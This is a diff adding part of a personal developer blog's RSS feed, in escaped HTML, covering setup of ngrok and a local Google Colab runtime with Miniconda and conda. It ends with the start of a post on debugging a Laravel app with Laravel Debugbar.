+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 65.18987341772153%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAABYlAAAWJQFJUiTwAAACGklEQVQ4y52TwW7TQBRF/R1I/AIrvoPCD9AVC6gUlW2E5CX1Ar6FXSUkFqgpIomdxC6osUCsSho7sceJG8/MmxlfNE7SFjVlgUZHT+Pre9/Ms+ycHn94FJ99fRfH46NfP38cxeex1z3peONR3xv1el6vc+JF/S/e96DnjUe+F4dBwzgMvPORv61v43DwvvPp42Nn4PdfXJULZFmO2XyOeZYjyxgKxsDyHHmWNbVgefPsBqvNwRhr3lkWBcLh8LUTDAbPORcwxghVVaSrkowsyRAnTUSaFJFU1CwpSUlFRll0U+3SxggpJcIoeukEQbBfVRVIayOStO4GFzjuXCCKM5RXAlcrDSlrCEHgVQXOFYzWqI1BrTUk57Uk0pxzhGF4cB2otDJiWdaDs0t89hN8i2dgWY55mmKeTCFWK2giKClA4gYpRG0vIoS4FcgrKKVMxXmdTC+QJhNMpjP8nlyuZ8QY7FiI6C/kmruBvOJNIOe8TtMZpkmKy6QAK0rY2VizNdhrCc6bKsW6gZRyRyC/HZgiSWeYTHMwtkBZllgul9ds983c/xVIRIaIaq011ijbpDHZumW734TtDtx001b8H4hIbb7yK2c4HO7bdK21VkrVd9H21A27dWU1ZU8bRdGB0+1294uiuDOr29i/KMuLe3XrXSwW8H3/wGm1Wg9c133quu4T13X3dtFut/fa7Td79+kb77PDw8OHfwCONpkLPTMIHAAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;ngrok_server_error.png&quot;
+        title=&quot;ngrok_server_error.png&quot;
+        src=&quot;/static/a14ae9d610289c9a4358f8a1a64e58ef/f058b/ngrok_server_error.png&quot;
+        srcset=&quot;/static/a14ae9d610289c9a4358f8a1a64e58ef/c26ae/ngrok_server_error.png 158w,
+/static/a14ae9d610289c9a4358f8a1a64e58ef/6bdcf/ngrok_server_error.png 315w,
+/static/a14ae9d610289c9a4358f8a1a64e58ef/f058b/ngrok_server_error.png 630w,
+/static/a14ae9d610289c9a4358f8a1a64e58ef/40601/ngrok_server_error.png 945w,
+/static/a14ae9d610289c9a4358f8a1a64e58ef/78612/ngrok_server_error.png 1260w,
+/static/a14ae9d610289c9a4358f8a1a64e58ef/f3d76/ngrok_server_error.png 3248w&quot;
+        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+        decoding=&quot;async&quot;
+      /&gt;
+  &lt;/a&gt;
+    &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;To fix this, you need to setup auth token:&lt;/p&gt;
+&lt;p&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
+    &gt;
+      &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/cdaeac05f3fa46581f0795877cbac3e0/f3d76/ngrok_auth_setup.png&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+    &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 65.18987341772153%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAABYlAAAWJQFJUiTwAAADM0lEQVQ4y22RX2hTVxzH75MgiLWbjiVNG3UPzlFriBYHbv5jg8LA6tPYy+LLHmKwY+xhYFkqMpiXTdn25OMKivgiMlAmtktW0jZt0mo6NE2b3sYujWnX5P7Jzb33nHPv+Y57m1mEHfjw/Z4fhy/fw08ozY73aNWF66ulhWvl4vNrc9mMmH9eEP9eKYnlkiTmn0yLhdyMWMhlxcLTFrlN5p9mxHlXc9nvF+dmb6RGHx0Vvo6LX4g3buLyN1fx3dUfUS5XUJdVKKqGhq5DVRSoqgpN017h3t25XJehqCpqtZrn53K5r4Tt7T2f+7o+xO49vVbn/o9oMm/SbBk0XdpkegV06gXo+BKjqSKjqUVK0y/wiqlNtSYkhvsj01Eh0H0hcvTjOLpPXHa6Tw/xBzkTiUVgpOBgpMDx+zOG32Z13E6UMfx4GcOPJdzLKPijwJAscvcNH12APTpPcffhREwIdoUj7x44Cb8v7Bzq6eMPck0kim4gMFbkmCrqSC82kJFMjOdlTC8Z+Kvi4NdkE3fSFH8uoRXIcPfhZEzYGzwSee/gKQT8R5yew308+UxDZgWYXGKYkiiyyxYyLf7zT1YYEnmC5DxBepnxScm2J4sm7j2aiAldXsNT6PD3OqFQH69UqlBVDYZhgBAKq4VpbXnDtEApAaMUlkU4ZcxWNQ2JRCImdPi6I/uDYQR8h5xw6AxfW1v3tqso7mYbXrjr3c266tJsNkEpg+Nw2I7DOWC7My/wLf/xyO69n2JX52fOgdAFL1DXDSiKhkZDh6bpULUGtMaWWoTAtAhM03LhFqFbDXf4zkXeDP2CrhO37OD713ml8pIrssJ1XeeUEk4J4e63LMvihFjcMEyu603uODYHuHcAMLfh2NjYRaEtcD6yp/cm3jh2237ng594tbrGN2oy36gpvFZXuaI0PHUxTMINi3hKKOOE2h6UOcw0TczMzMSEXR2fRNrDP6P92DD2Hf8BkiShuraO1dWX2NiovUa9LqMuK5u4voUsK1hf/wepVComtLUF/Dt27ju3bXvw7Nu+g/0DA1/2X4zG+i9dGui/cmXoNeLxb/+XoXj87ODg4PloNNr5L9t4JECq8ZwEAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;ngrok_auth_setup.png&quot;
+        title=&quot;ngrok_auth_setup.png&quot;
+        src=&quot;/static/cdaeac05f3fa46581f0795877cbac3e0/f058b/ngrok_auth_setup.png&quot;
+        srcset=&quot;/static/cdaeac05f3fa46581f0795877cbac3e0/c26ae/ngrok_auth_setup.png 158w,
+/static/cdaeac05f3fa46581f0795877cbac3e0/6bdcf/ngrok_auth_setup.png 315w,
+/static/cdaeac05f3fa46581f0795877cbac3e0/f058b/ngrok_auth_setup.png 630w,
+/static/cdaeac05f3fa46581f0795877cbac3e0/40601/ngrok_auth_setup.png 945w,
+/static/cdaeac05f3fa46581f0795877cbac3e0/78612/ngrok_auth_setup.png 1260w,
+/static/cdaeac05f3fa46581f0795877cbac3e0/f3d76/ngrok_auth_setup.png 3248w&quot;
+        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+        decoding=&quot;async&quot;
+      /&gt;
+  &lt;/a&gt;
+    &lt;/span&gt;&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;$ ngrok config add-authtoken &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;your_auth_token&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;
+Authtoken saved to configuration file: /Users/xxx/.ngrok2/ngrok.yml
+
+&lt;span class=&quot;token comment&quot;&gt;# Check the config file&lt;/span&gt;
+$ &lt;span class=&quot;token function&quot;&gt;cat&lt;/span&gt; /Users/xxx/.ngrok2/ngrok.yml
+region: us
+version: &lt;span class=&quot;token string&quot;&gt;&apos;2&apos;&lt;/span&gt;
+authtoken: &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;your_auth_token&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Restart the colab server:&lt;/p&gt;
+&lt;p&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
+    &gt;
+      &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/9230ff77e0a564277eedbf37f6c2ce8e/f3d76/ngrok_server.png&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+    &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 65.18987341772153%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAABYlAAAWJQFJUiTwAAAB2ElEQVQ4y52SzW7TQBDH/RxIvAInnqOUFyAnDm0QEremas/UB3gVbj0gcSlNITiOYzcVIUKFigqa+Cu21/vltf9ot00JINSSw08zszP71+zMWt39V/c+n3x48eXr2d75t/O909Mz+93Bof0p8Oyx79kffc+ejHx7crzEyLfHwdDkxsHAHg+d5xPffdl98/q+1Xf6j7OsQJgyzOIS05jg+zRDkvFr0j9tzhGlFLOYIEoKRFGCNMnhDfxnVs/xH+WkAhMNp7yRGiYgF/5tYAK8oAquN9qwes6wlROBktU1oaohVOE/aUqmVE4kXO+4bfUcr5UTjpKpmtCqKVkFQitQXuuuDVTU0OeLnGbJ13dUUQq4XqAFB1eCVU2obAiVpjhK5vhxEeJiFhufcj0WBakaiKrGZZ3U9naCOaFI5jnSrEBWEBNTLsEEQEVjBC87vFHQFJlumKjBZW2sjrkQ2D8Q6HoSlZIoyn8KsmvBq2dAF/wFFUgzgXkuFs9dEuS/BLPCLEXpAd8EZWYJv52VrKr0T3EHwabl9P2WXj+XUEygWZGqZDW84UnbenvYa03DufnxYbwaUVxgFmY4eu+2rY3NJ3c627vrW52dta3OzoMVWets7z5st5/e/QnBMZlI296A2AAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;ngrok_server.png&quot;
+        title=&quot;ngrok_server.png&quot;
+        src=&quot;/static/9230ff77e0a564277eedbf37f6c2ce8e/f058b/ngrok_server.png&quot;
+        srcset=&quot;/static/9230ff77e0a564277eedbf37f6c2ce8e/c26ae/ngrok_server.png 158w,
+/static/9230ff77e0a564277eedbf37f6c2ce8e/6bdcf/ngrok_server.png 315w,
+/static/9230ff77e0a564277eedbf37f6c2ce8e/f058b/ngrok_server.png 630w,
+/static/9230ff77e0a564277eedbf37f6c2ce8e/40601/ngrok_server.png 945w,
+/static/9230ff77e0a564277eedbf37f6c2ce8e/78612/ngrok_server.png 1260w,
+/static/9230ff77e0a564277eedbf37f6c2ce8e/f3d76/ngrok_server.png 3248w&quot;
+        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+        decoding=&quot;async&quot;
+      /&gt;
+  &lt;/a&gt;
+    &lt;/span&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2&gt;Installation Colab with Conda&lt;/h2&gt;
+&lt;h3&gt;&lt;a href=&quot;https://repo.anaconda.com/miniconda/&quot;&gt;Conda install shells&lt;/a&gt;&lt;/h3&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;$ &lt;span class=&quot;token function&quot;&gt;wget&lt;/span&gt; https://repo.anaconda.com/miniconda/Miniconda3-latest-MacOSX-arm64.sh
+$ &lt;span class=&quot;token function&quot;&gt;chmod&lt;/span&gt; +x Miniconda3-latest-MacOSX-arm64.sh
+$ ./Miniconda3-latest-MacOSX-arm64.sh
+
+Welcome to Miniconda3 py310_23.3.1-0
+
+In order to &lt;span class=&quot;token builtin class-name&quot;&gt;continue&lt;/span&gt; the installation process, please review the license
+agreement.
+Please, press ENTER to &lt;span class=&quot;token builtin class-name&quot;&gt;continue&lt;/span&gt;
+&lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 
+&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;
+End User License Agreement - Miniconda
+&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;
+&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;.
+Please answer &lt;span class=&quot;token string&quot;&gt;&apos;yes&apos;&lt;/span&gt; or &lt;span class=&quot;token string&quot;&gt;&apos;no&apos;&lt;/span&gt;&lt;span class=&quot;token builtin class-name&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;
+&gt;&gt;&gt; yes
+
+Miniconda3 will now be installed into this location:
+/Users/xxx/miniconda3
+
+  - Press ENTER to confirm the location
+  - Press CTRL-C to abort the installation
+  - Or specify a different location below
+
+[/Users/xxx/miniconda3] &gt;&gt;&gt;
+PREFIX=/Users/xxx/miniconda3
+Unpacking payload ...
+...
+by running conda init? [yes|no]
+[yes] &gt;&gt;&gt; yes
+no change     /Users/xxx/miniconda3/condabin/conda
+no change     /Users/xxx/miniconda3/bin/conda
+no change     /Users/xxx/miniconda3/bin/conda-env
+no change     /Users/xxx/miniconda3/bin/activate
+no change     /Users/xxx/miniconda3/bin/deactivate
+no change     /Users/xxx/miniconda3/etc/profile.d/conda.sh
+no change     /Users/xxx/miniconda3/etc/fish/conf.d/conda.fish
+no change     /Users/xxx/miniconda3/shell/condabin/Conda.psm1
+modified      /Users/xxx/miniconda3/shell/condabin/conda-hook.ps1
+no change     /Users/xxx/miniconda3/lib/python3.10/site-packages/xontrib/conda.xsh
+no change     /Users/xxx/miniconda3/etc/profile.d/conda.csh
+modified      /Users/xxx/.zshrc
+
+==&gt; For changes to take effect, close and re-open your current shell. &amp;lt;==
+
+If you&apos;&lt;/span&gt;d prefer that conda&apos;s base environment not be activated on startup, 
+   &lt;span class=&quot;token builtin class-name&quot;&gt;set&lt;/span&gt; the auto_activate_base parameter to false: 
+
+conda config &lt;span class=&quot;token parameter variable&quot;&gt;--set&lt;/span&gt; auto_activate_base &lt;span class=&quot;token boolean&quot;&gt;false&lt;/span&gt;
+
+Thank you &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; installing Miniconda3&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3&gt;Create and avtivate a new environment&lt;/h3&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;$ conda create &lt;span class=&quot;token parameter variable&quot;&gt;-y&lt;/span&gt; &lt;span class=&quot;token parameter variable&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;env_name&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token assign-left variable&quot;&gt;python&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3.11&lt;/span&gt;
+$ conda activate &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;env_name&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3&gt;Install google colab&lt;/h3&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;$ conda &lt;span class=&quot;token function&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;token parameter variable&quot;&gt;-c&lt;/span&gt; conda-forge google-colab&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3&gt;Activate your conda environment.&lt;/h3&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;$ python &lt;span class=&quot;token parameter variable&quot;&gt;-m&lt;/span&gt; ipykernel &lt;span class=&quot;token function&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;token parameter variable&quot;&gt;--user&lt;/span&gt; &lt;span class=&quot;token parameter variable&quot;&gt;--name&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;env_name&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h2&gt;Warnings&lt;/h2&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;Installing collected packages: pip
+  WARNING: The scripts pip, pip3, pip3.10 and pip3.9 are installed &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;/Users/xxx/Library/Python/3.9/bin&apos;&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;which&lt;/span&gt; is not on &lt;span class=&quot;token environment constant&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;token builtin class-name&quot;&gt;.&lt;/span&gt;
+  Consider adding this directory to &lt;span class=&quot;token environment constant&quot;&gt;PATH&lt;/span&gt; or, &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; you prefer to suppress this warning, use --no-warn-script-location.
+Successfully installed pip-23.1.2
+WARNING: You are using pip version &lt;span class=&quot;token number&quot;&gt;21.2&lt;/span&gt;.4&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; however, version &lt;span class=&quot;token number&quot;&gt;23.1&lt;/span&gt;.2 is available.
+You should consider upgrading via the &lt;span class=&quot;token string&quot;&gt;&apos;/Applications/Xcode.app/Contents/Developer/usr/bin/python3 -m pip install --upgrade pip&apos;&lt;/span&gt; command.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;I’ve seen this warning when installing &lt;code class=&quot;language-text&quot;&gt;pip&lt;/code&gt; with &lt;code class=&quot;language-text&quot;&gt;pip3&lt;/code&gt;. And it’s because the &lt;code class=&quot;language-text&quot;&gt;pip&lt;/code&gt; executable is installed in a directory that is not on your &lt;code class=&quot;language-text&quot;&gt;PATH&lt;/code&gt;.
+There are three duplicate &lt;code class=&quot;language-text&quot;&gt;pip&lt;/code&gt; executables installed on my system:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;/opt/homebrew/bin/python3&lt;/li&gt;
+&lt;li&gt;/Users/xxx/Library/Python/3.9/bin&lt;/li&gt;
+&lt;li&gt;/Applications/Xcode.app/Contents/Developer/usr/bin/python3&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;If you see this warning, you can add the following to your &lt;code class=&quot;language-text&quot;&gt;~/.zshrc&lt;/code&gt; file:&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;&lt;span class=&quot;token builtin class-name&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;token assign-left variable&quot;&gt;&lt;span class=&quot;token environment constant&quot;&gt;PATH&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;/opt/homebrew/bin/python3:&lt;span class=&quot;token environment constant&quot;&gt;$PATH&lt;/span&gt;&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h2&gt;References&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;a href=&quot;https://towardsdatascience.com/colabcode-deploying-machine-learning-models-from-google-colab-54e0d37a7b09&quot;&gt;https://towardsdatascience.com/colabcode-deploying-machine-learning-models-from-google-colab-54e0d37a7b09&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://medium.com/analytics-vidhya/colab-vs-code-github-jupyter-perfect-for-deep-learning-2b257ae94d01&quot;&gt;https://medium.com/analytics-vidhya/colab-vs-code-github-jupyter-perfect-for-deep-learning-2b257ae94d01&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;</content:encoded></item><item><title><![CDATA[Debug laravel app]]></title><description><![CDATA[1. Laravel Debugbar 1.1 Add requirement 1.2 Change config 1.3 Publish ### 1.4 Check  1.5 Clear cache & config ## 2. Xdebug + VS code + macOS]]></description><link>https://engelin.github.io/debug-laravel-app/</link><guid isPermaLink="false">https://engelin.github.io/debug-laravel-app/</guid><pubDate>Tue, 09 May 2023 16:14:01 GMT</pubDate><content:encoded>&lt;h2&gt;1. Laravel Debugbar&lt;/h2&gt;
+&lt;h3&gt;1.1 Add requirement&lt;/h3&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;$ php composer.phar require barryvdh/laravel-debugbar &lt;span class=&quot;token parameter variable&quot;&gt;--dev&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3&gt;1.2 Change config&lt;/h3&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;php&quot;&gt;&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;diff &lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;git a&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;config&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;app&lt;span class=&quot;token operator&quot;&gt;.&lt;/span&gt;php b&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;config&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;app&lt;span class=&quot;token operator&quot;&gt;.&lt;/span&gt;php
+index &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;c5820c4&lt;span class=&quot;token operator&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;.8&lt;/span&gt;ddaee54 &lt;span class=&quot;token number&quot;&gt;100644&lt;/span&gt;
+&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; a&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;config&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;app&lt;span class=&quot;token operator&quot;&gt;.&lt;/span&gt;php
+&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; b&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;config&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;app&lt;span class=&quot;token operator&quot;&gt;.&lt;/span&gt;php
+@@ &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt; @@ &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;
+ 
+         &lt;span class=&quot;token class-name class-name-fully-qualified static-context&quot;&gt;App&lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;Providers&lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;GoogleDriveServiceProvider&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+ 
+&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;        &lt;span class=&quot;token comment&quot;&gt;/*
++         * Laravel Debugbar
++         */&lt;/span&gt;
+&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;        &lt;span class=&quot;token class-name class-name-fully-qualified static-context&quot;&gt;Barryvdh&lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;Debugbar&lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;ServiceProvider&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+     &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+ 
+     &lt;span class=&quot;token comment&quot;&gt;/*
+@@ -258,6 +262,10 @@ return [
+         &apos;Excel&apos;        =&gt; Maatwebsite\Excel\Facades\Excel::class,
+         &apos;PDF&apos;          =&gt; Barryvdh\DomPDF\Facade::class,
+ 
++        /*
++         * Debugbar Aliases
++         */&lt;/span&gt;
+&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;        &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;Debugbar&apos;&lt;/span&gt;     &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token class-name class-name-fully-qualified static-context&quot;&gt;Barryvdh&lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;Debugbar&lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;Facade&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+     &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+ 
+ &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3&gt;1.3 Publish&lt;/h3&gt;
